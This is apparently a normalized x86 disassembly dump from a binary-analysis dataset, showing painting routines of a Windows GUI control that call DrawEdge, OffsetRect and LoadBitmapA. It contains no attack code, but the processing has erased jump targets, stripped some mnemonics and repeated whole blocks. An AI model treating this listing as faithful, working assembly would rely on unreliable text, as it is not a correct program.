cmp [ eax + 0x2c ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x3d ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3d ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x3c ]
call sub_402cd8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x34 ]
cmp eax [ edx + 0x34 ]
jg r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
movzx eax [ eax + 0x2c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40fc38
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x35 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x35 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x35 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
add eax [ edx + 0x28 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
add eax [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x59 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x59 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_40f36c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x44 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x35 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0x8000000d
call sub_40f388
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x58 ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x34 ] 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0x8000000f
call sub_40f388
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40f808
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_40f36c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x44 ] eax
mov edx 0x80000014
mov eax 0x8000000f
call sub_417034
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_40f338
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40f808
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
add eax [ edx + 0x28 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
add eax [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x58 ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x2d ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x60 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x61 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40fc38
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40f808
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
xor eax eax
push ebp
push sub_407f19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
call sub_415a4c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x44 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0x80000012
call sub_40e9f8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x3c ]
call sub_402cd8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x34 ]
cmp eax [ edx + 0x34 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_40f388
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x35 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x21 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x60 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ecx [ eax + 0x24 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
call sub_4078b8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x54 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_40ed4c
mov eax [ ebp + 0x8 ]
or [ eax - 0x60 ] 0x100000
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40fc38
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ecx [ eax + 0x40 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40f964
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x58 ]
lea edi [ edx - 0x10 ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov al [ eax + 0x2d ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x3c ]
call sub_403080
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_40f744
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_40e9f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
call sub_44c070
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x21 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x60 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ecx [ eax + 0x24 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
call sub_4078b8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4083b2
lea eax [ ebp - 0x4 ]
call sub_44cae0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x59 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x21 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ax [ eax + 0x54 ]
call sub_40672c
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
call sub_4078b8
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_4083c8
push ebp
mov ebp esp
push 0x0
push esi
push edi
xor eax eax
push ebp
push sub_408c5d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40f808
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x2d ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x2d ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov al [ eax + 0x50 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x2d ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x24 ]
mov edx r-xdata
call sub_44ce70
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40f808
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x35 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x34 ] 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x2c ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x3d ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3d ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x3c ]
call sub_402cd8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x34 ]
cmp eax [ edx + 0x34 ]
jg r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
movzx eax [ eax + 0x2c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40fc38
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x35 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x35 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x35 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
sub eax [ edx + 0x28 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
add eax [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x59 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x59 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_40f36c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x44 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x35 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0x8000000d
call sub_40f388
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x58 ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x34 ] 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0x8000000f
call sub_40f388
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40f808
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_40f36c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x44 ] eax
mov edx 0x80000014
mov eax 0x8000000f
call sub_417034
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_40f338
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40f808
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
sub eax [ edx + 0x28 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
add eax [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x58 ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x2d ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x60 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x61 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40fc38
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40f808
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
xor eax eax
push ebp
push sub_4087a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
call sub_415a4c
